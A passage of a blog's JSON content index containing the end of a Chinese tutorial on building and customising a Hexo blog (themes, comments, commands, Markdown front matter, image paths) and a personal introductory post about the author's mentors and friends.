如果没有爆出错误，说明配置成功，可以打开xxx.git.coding.net(xxx为自己的id)查看自己的博客主页。如果报错，请检查前面的配置有没有错误，如果找不到错误，请参见Hexo的常见报错. Hexo的优化Hexo提供了一个默认主题，我们可以在官方网址寻找我们自己喜欢的主题。这是我的主题yilia 挑选好主题之后，在hexo目录下Git Bash，键入： $ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 在Hexo目录下，修改_config.yml里的项目 theme: yilia 然后在hexo目录下键入: hexo g 每一个主题和主题的名字都有不同，但大部分主题，都会提供详细的书写方式。 加入多说评论系统1.注册多说2.创建新项目，shortname用你的ID小写由于博主主题只带多说评论系统插件，这里不多解释，只需要在hexo\\themes\\yilia下打开_config.yml，修改 duoshuo: Cyris 关于统计，打赏系统可以注册百度站长平台，里面有详细的使用方法。 其他1.如果想要修改边框，头像，边栏超链接地址，这个一般因不同的主题而异，所以不好详述，详细要参阅对应的官方文档。 2.其实hexo还能添加很多不同的插件，博主修为尚浅，所以就不写出不清楚的插件用法，这里贴上一些别人的博客。Hexo的优化与定制 Hexo的使用我们终于搭好了自己的Blog，却发现并没有“写博客”的功能。 常用命令12345hexo new \"postName\" #新建文章hexo new page \"pageName\" #新建页面hexo g #生成静态页面至public目录hexo s #开启预览访问端口（默认端口4000，'ctrl + c'关闭server）hexo d #将.deploy目录部署到coding 1.第一个命令也就是最常用的命令，postname可以替换为我们想要的文章名，文章名方便记忆就好，只是在书写的时候我们能够区分就可以了，别人是看不到的。 2.第二个命令比较复杂，但是如果仅仅是写博文的话，第二个是用不到的。 3.3,5命令就不用多解释了，每次写完博文，都需要这两个命令上传。 Markdowm语法当我们输入命令，新建了一个文章，我们发现在hexo文件夹下source/_posts下生成了一个md文件，md文件是什么呢？我们首先得了解Markdown语法。（本人用Markdownpad编辑器） .md文章头部12345678title: postName #文章页面上的显示名称，可以任意修改，不会出现在URL中date: 2017-04-05 15:30:16 #文章生成时间，一般不改，当然也可以任意修改categories:- example #分类,多个分类依次tags: - tag1 #文章标签，可空，多标签请用格式，注意:后面有个空格description: #附加一段文章摘要，字数最好在140字以内。--- 贴上Markdown语法 关于本地图片和所属路径的问题当我们想使用我们自己的本地图片的时候，我们会纠结一件事，就是我们该把文件放在哪？路径又该怎么引用，我来解释下这个问题： 1.当我们编辑好我们的博文的时候，我们输入指令hexo g ，会自动生成所对应的html页面添加到hexo文件夹下的public，然后上传public，所以public便是我们的主目录。 2.但是我们发现public内的东西是修改不了的，所以本地图片不能存放在public中，所以我们要把图片放在source中，在source中新建img文件夹，然后建对应博文的文件夹，放置所属的图片，这样当我们需要引用本地图片的时候，则输入这样的路径(/img/Hexo_Blogs/1.png),然后我们就发现，图片没有问题了。 写在后面的折腾了好久，搭完的时候还是很开心的，也算是完成了一个长久以来的心愿，也希望阅读的人在看完这篇教程后能够学会搭建一个自己的小空间。 再次感谢粉学姐和土土的教程，侵删。 以上。","tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://icyris.github.io/tags/Hexo/"}]},{"title":"写在前面的","date":"2017-04-04T08:19:49.000Z","path":"2017/04/04/acaleph/","text":"一、绿生 干净·深刻·精致这是那一刻的绿生，所带给我的欣喜。 二、一些话一直有搭一个个人博客的想法，现在终于做了起来。花了点时间，却也很开心。这里是Cyris的个人小站，他和阅读这篇文字的你们一样，经历和思考着这些那些。前几天和Ak师傅聊了聊，有了些新的想法，也有了下面的这些话。 有事想做的兴奋存一点也不错，干干净净地着手做起来也很棒。把日子过得精致即可。这份精致，也是对生活的一种自信。“我们读诗写诗，非为它的灵巧，我们读诗写诗，因为我们是人类的一员。而人类充满了热情”，对我来说，最有魅力的，还是那些拥有自己的热情的人。这里想提提Acaleph，Aklis以及蔡师傅。 蔡师傅是位地理教师，喜欢穿衬衫，卷袖子。他的课，一卷书，一张嘴，一幅画。他总能很流畅而优美地解释一些枯燥的东西，知识也好，做人也好，很是亲和。夏天吃完午饭，可以看到他靠着阳光在车里睡觉，这对于匆匆赶路的准备高考的我们来说，再棒不过。留点时间给自己。他也普通，也会抱怨，也会醉酒，也会点着烟，即使如此，他的烟味并非毫无营养，并熏染了一片人。他经历了很多我们所不能承受的东西，却也过得安和。某天有幸在路上遇到他，问，要去哪里呢，他说，去看看夫人，就在那边的餐馆里，刚开业，会忙。这让我想起来某节课上，他说，今天女儿要回来，雨大，我想就上半节课，去机场接接她。话后，教室很是安静，这半节课大家听得也很是用心。拍肩是个很简单的动作，但却感动了Cyris很久。平静却深刻的东西，最让人记忆。 在面试以后就没有和Ak师傅聊过了，中间也去过几次协会，那时候刚起步学C和Python，也不知道怎么和满屋的dalao们交流，Ak说，是这样的。很久没聊了，有空过来聊聊吧。有幸遇到Ak师傅。协会的新生测试后又和他聊了聊，讲了讲从开发到学习linux和渗透等方面的东西，虽然只是一个晚上，但Cyris对下面所要做的事，更清晰了点，这站博客，只是第一步。Ak师傅影响Cyris的地方在哪呢？Acaleph说过一句话，大概是，二十岁的人去玩三岁的时候想玩的玩具就没有意义了。Ak师傅可以把知识玩起来。在早先的培训中，他在讲知识的时候，Cyris从他的眼睛里看到了一种很稀有的成分。玩也是一种艺术，能把想玩的东西玩好的人，很棒。Ak说，探求真理者不可心存傲慢。共勉。 首先感谢Acaleph能让Cyris放纵喜欢，从起初的“可以说话的人”到现在各个领域的陪伴，很开心。最早见面的时候Cyris说，她就像早晨四五点的天空，虽然还没有看到具体的光亮，但那种色彩的欲出，让人兴奋不已，并开始期待着这一天，并开始期待着下一天。她有着一份优雅。Cyris很喜欢一句话，“抬头做人，低头做事”，我觉得她正是这样的一个人。她的喜欢与不喜欢很清晰，想要什么很明确，并能很努力地去尝试摘到它。我一直被一些自己不是很喜欢的理念束缚着，比如也会有没写完作业就没什么心情看自己喜欢的书什么的情况，这些都在慢慢改变。时间有限，能多做一点喜欢的事情，挺好。但这也不是一种逃脱的借口，所谓优秀，大概是最快速而质量地完成“其他任务”并精心投入到自己想完成的事中去吧ouo。愿我们都能成为我们所想成为的人。 三、关于我Web初学者，偶尔也会在站内发布一些文字。很喜欢一些有创造力的，听着舒服的音乐，喜欢提琴，喜欢动漫,喜欢自由地思考。有什么有趣的想法或者想探讨的问题，欢迎左转邮箱/知乎联系Cyris。绿生，抓住有味。 以上。","tags":[{"name":"樱花","slug":"樱花","permalink":"https://icyris.github.io/tags/樱花/"},{"name":"绿生","slug":"绿生","permalink":"https://icyris.github.io/tags/绿生/"}]}]